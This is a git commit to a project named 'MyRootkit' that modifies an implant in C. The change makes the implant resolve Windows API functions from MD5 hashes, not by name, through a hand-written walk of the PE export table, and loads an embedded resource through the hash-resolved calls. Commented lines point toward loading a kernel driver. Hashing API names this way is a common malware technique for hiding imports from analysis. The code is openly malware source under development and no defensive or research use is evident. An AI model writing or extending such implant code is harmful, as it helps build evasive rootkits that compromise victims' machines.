6832ac1ba8946af66625a568b62dd92db9d208f4
Prince 2 lu <Prince 2 lu@DESKTOP>
2023-04-18 21:34:07 +0200

    Final Implementation, md5, todo:compilation

--- MyRootkit/implant.c
+++ MyRootkit/implant.c
@@ -39,7 +39,7 @@ PVOID SelfGetModuleHandle(uint8_t name[16]) {
     }
     return NULL;
 }
-PVOID SelfGetProcAddress(HMODULE module, char* name) {
+PVOID SelfGetProcAddress(HMODULE module, uint8_t name[16]) {
     PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((uint8_t*)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);//get imageNtHeader from DOS_HEADER (e_lfanew = logical file address) (entire dll relocated)
     PIMAGE_OPTIONAL_HEADER imageOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&NtHeaders->OptionalHeader; //getting closer of Export directory by reading OptionalHeader
     PIMAGE_DATA_DIRECTORY imageDataDirectory = &(imageOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT/*winnt.h*/]);//first element (index0) of Optional header array is the exort table
@@ -48,10 +48,12 @@ PVOID SelfGetProcAddress(HMODULE module, char* name) {
     PDWORD exportAddressTable = (PDWORD)((uint8_t*)module + imageExportDirectory->AddressOfFunctions);//function address ( function rva)
     PWORD /*unsigned short*/ nameOrdinalsPointer = (PWORD)((uint8_t*)module + imageExportDirectory->AddressOfNameOrdinals);//contains the address of the function by the name
     PDWORD exportNamePointerTable = (PDWORD)((uint8_t*)module + imageExportDirectory->AddressOfNames);//pointer to the name 
+    uint8_t* result = malloc(16);
     for (size_t nameIndex = 0; nameIndex < imageExportDirectory->NumberOfNames; nameIndex++)
     {
         char* exportname = (char*)((uint8_t*)module + exportNamePointerTable[nameIndex]);
-        if (strcmp(name, exportname) == 0) {
+        md5String(exportname, result);
+        if (memcmp(result, name, 16) == 0) {
             DWORD ordinal = nameOrdinalsPointer[nameIndex];
             PDWORD targetFunctionAddress = (PDWORD)((uint8_t*)module + exportAddressTable[ordinal]);
             return targetFunctionAddress;
@@ -61,36 +63,7 @@ PVOID SelfGetProcAddress(HMODULE module, char* name) {
 }
 /*https://res.cloudinary.com/practicaldev/image/fetch/s--sMtYPRHi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ahb7ncw4rop0ogid77t2.png
 */
-typedef
-double
-(__stdcall* POW)(
-    double a,
-    double b
-    );
-typedef
-HRSRC
-(__stdcall* FINDRESSOURCEA)(
-    HMODULE hModule,
-    LPCSTR  lpName,
-    LPCSTR  lpType
-    );
-typedef
-HGLOBAL
-(__stdcall* LOADRESSOURCE)(
-    HMODULE hModule,
-    HRSRC   hResInfo
-    );
-typedef
-DWORD
-(__stdcall* SIZEOFRESSOURCE)(
-    HMODULE hModule,
-    HRSRC   hResInfo
-    );
-typedef
-LPVOID
-(__stdcall* LOCKRESSOURCE)(
-    HGLOBAL hResData
-    );
+
 int main() {
 
     uint8_t ntdllHash[16] = { 0xa3,0xcb,0x33,0x79,0xad,0x0c,0xf1,0x93,0xfa,0xe7,0x5c,0xa4,0x71,0x86,0xc0,0x02 };
@@ -104,41 +77,35 @@ int main() {
         return 1;
     }
     if (ntdllBase == NULL) {
-        printf("Error ntdll.dll doesnt exist\n", ntdllBase);
+        printf("Error ntdll.dll doesnt exist\n");
     }
     else {
-        POW pow = (POW)SelfGetProcAddress(ntdllBase, "pow");
+        POW pow = (POW)SelfGetProcAddress(ntdllBase, "\x30\xd7\xe0\x49\x43\x51\xde\xf4\x55\x91\xfc\xcb\x21\xd3\x51\x0b");
         printf("%f\n", pow(2.0, 3.0));
     }
-
-    /*
-    FINDRESSOURCEA FindResourceW_ = (FINDRESSOURCEA)SelfGetProcAddress(kerneldllBase, "FindResourceW");
+  
+    FINDRESSOURCEA FindResourceW_ = (FINDRESSOURCEA)SelfGetProcAddress(kerneldllBase, "\xfc\x44\x16\xe1\xc0\xc4\xc1\xf3\xbc\x9d\xbc\xb4\x3e\xae\x96\x3f");
+    if (FindResourceW_ == NULL) {
+        printf("Error FindRessourceW");
+        return 1;
+    }
+    
     HRSRC BmpRessource = FindResourceW_(NULL, MAKEINTRESOURCE(IDB_BITMAP1), MAKEINTRESOURCE(2));
 
-    LOADRESSOURCE LoadResource_ = (LOADRESSOURCE)SelfGetProcAddress(kerneldllBase, "LoadResource");
+    LOADRESSOURCE LoadResource_ = (LOADRESSOURCE)SelfGetProcAddress(kerneldllBase, "\x88\x40\xae\xbf\xbc\x90\x05\xe6\xe3\x41\x86\x60\xfe\x3e\xf1\xb1");
     HGLOBAL GlobalRessource = LoadResource_(NULL, BmpRessource);
     if (!GlobalRessource) {
         printf("Global Ressource Error !!!");
         return 1;
     }
-    SIZEOFRESSOURCE SizeofRessource_ = (SIZEOFRESSOURCE)SelfGetProcAddress(kerneldllBase, "SizeofResource");
+    SIZEOFRESSOURCE SizeofRessource_ = (SIZEOFRESSOURCE)SelfGetProcAddress(kerneldllBase, "\x75\xa4\xf2\xff\xef\x11\x13\x69\x1d\xdb\x91\xca\xfe\x19\x8a\x95");
     size_t FileSize = SizeofRessource_(NULL, BmpRessource);
-    LOCKRESSOURCE LockResource_ = (LOCKRESSOURCE)SelfGetProcAddress(kerneldllBase, "LockResource");
+    LOCKRESSOURCE LockResource_ = (LOCKRESSOURCE)SelfGetProcAddress(kerneldllBase, "\xe6\x77\x7c\x17\x5e\x59\xd6\xd2\xe5\x2d\x67\xc6\x1e\xf2\x66\x43");
     uint8_t* FilePtr = (uint8_t*)LockResource_(GlobalRessource);
     for (size_t i = 0; i < FileSize; i++)
     {
         printf("%x", FilePtr[i]);
-    }*/
-
-    /*
-    char* data = "Salut!";
-    uint8_t *result = malloc(16);
-    md5String(data, result);
-    for (size_t i = 0; i < 16; i++)
-    {
-        printf("%x", result[i]);
     }
-    */
     printf("\nFinish !\n");
     //SYSTEM_LOAD_AND_CALL_IMAGE Image;
     //WCHAR mypath[] = L"./driver.sys";
--- MyRootkit/implant_rsrc.h
+++ MyRootkit/implant_rsrc.h
@@ -28,4 +28,34 @@ VOID
 	PUNICODE_STRING DestinationString,
 	PCWSTR SourceString
 	);
+typedef
+double
+(__stdcall* POW)(
+    double a,
+    double b
+    );
+typedef
+HRSRC
+(__stdcall* FINDRESSOURCEA)(
+    HMODULE hModule,
+    LPCSTR  lpName,
+    LPCSTR  lpType
+    );
+typedef
+HGLOBAL
+(__stdcall* LOADRESSOURCE)(
+    HMODULE hModule,
+    HRSRC   hResInfo
+    );
+typedef
+DWORD
+(__stdcall* SIZEOFRESSOURCE)(
+    HMODULE hModule,
+    HRSRC   hResInfo
+    );
+typedef
+LPVOID
+(__stdcall* LOCKRESSOURCE)(
+    HGLOBAL hResData
+    );
 NTSTATUS ZwSetSystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength);
